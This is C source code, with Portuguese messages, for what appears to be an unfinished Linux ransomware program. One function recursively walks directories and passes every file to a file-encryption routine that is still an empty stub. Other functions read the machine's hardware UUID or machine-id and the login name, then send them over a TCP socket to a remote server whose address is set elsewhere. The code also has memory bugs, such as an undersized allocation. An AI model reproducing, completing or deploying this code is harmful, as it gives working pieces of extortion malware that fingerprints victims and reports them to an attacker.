#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <errno.h> 
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "funcs.h"

struct dirent *getdir;

void WhatIsDir(char *dir_sch){
	
	struct stat veirify;
	DIR *diretorio;
	char pathdir[1024];
	diretorio = opendir(dir_sch);

	if(diretorio == NULL){
		fprintf(stderr, "[INFO]: Ocorreu um erro ao tentar ler diretorio: %s\n", dir_sch);
		return;
	}
	
	while((getdir = readdir(diretorio)) != NULL){

		if(strncmp(getdir->d_name,".",sizeof(getdir->d_name)) == 0 || strncmp(getdir->d_name,"..", sizeof(getdir->d_name)) == 0) continue;
		sprintf(pathdir , "%s%s",dir_sch , getdir->d_name);

		stat(pathdir , &veirify);
		strncat(pathdir, "/", sizeof(pathdir)-1);
		if(S_ISDIR(veirify.st_mode)){
			printf("[ENTRANDO NO DIRETORIO]:  %s\n", pathdir);
			WhatIsDir(pathdir);
		}
		else{
			printf("[CRIPTOGRAFANDO ARQUIVO]:  %s\n", pathdir);
			encryptfile(pathdir);
		}

	}
	closedir(diretorio);
}


void connectserver(char *uuid, char *hostname){
	int sockfd;
	int status;
	printf("%s", uuid);
	struct sockaddr_in my_addr = {
		.sin_family = AF_INET,
		.sin_port = htons(myport),
		.sin_addr.s_addr = inet_addr(myhost),	
	};

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if(sockfd < 0){
		printf("[INFO]: Ocorreu um erro ao tentar criar o socket!");
	}
	status = connect(sockfd, (struct sockaddr *)&my_addr, sizeof(my_addr));
	if(status < 0){
		printf("[INFO]: Ocorreu um erro ao tentar se connectar ao servidor!");
	}
	if( (send(sockfd, uuid, strlen(uuid), 0)) < 0){
		printf("[INFO]: Ocorreu um erro ao tentar enviar o uuid");
	}

	if( (send(sockfd, hostname, strlen(hostname), 0)) < 0){
		printf("[INFO]: Ocorreu um erro ao tentar enviar o uuid");
	}
}

void encryptfile(char *name_dir){
	//int len = sizeof(getdir->d_name);

}

char *getuuid(){
	FILE *uuid;
	char id[140];
	char type[30];
	char *completeid;

	completeid = malloc(sizeof(char)*160);

	uuid = fopen("/sys/class/dmi/id/product_uuid", "r");
	memcpy(&type, "product_uuid", sizeof(type));

	if(uuid == NULL){

		memset(type, '\0', sizeof(type));
		memcpy(&type, "machine-id", sizeof(type));
		uuid = fopen("/etc/machine-id", "r");

		if(uuid == NULL){

			memset(type, '\0', sizeof(type));
			memcpy(&type, "board_serial", sizeof(type));
			uuid = fopen("/sys/class/dmi/id/board_serial", "r");
		}

	}

	
	fgets(id, sizeof(id), uuid);
	
	sprintf(completeid, "%s: %s", type, id);

	return completeid;
	
}

char *getpcname(){
	char hostname[60];
	char *name;

	name = (char *) malloc(sizeof(60*sizeof(char)));

  	getlogin_r(hostname, sizeof(hostname));
	sprintf(name, "Nome: %s", hostname);
	return name;
}
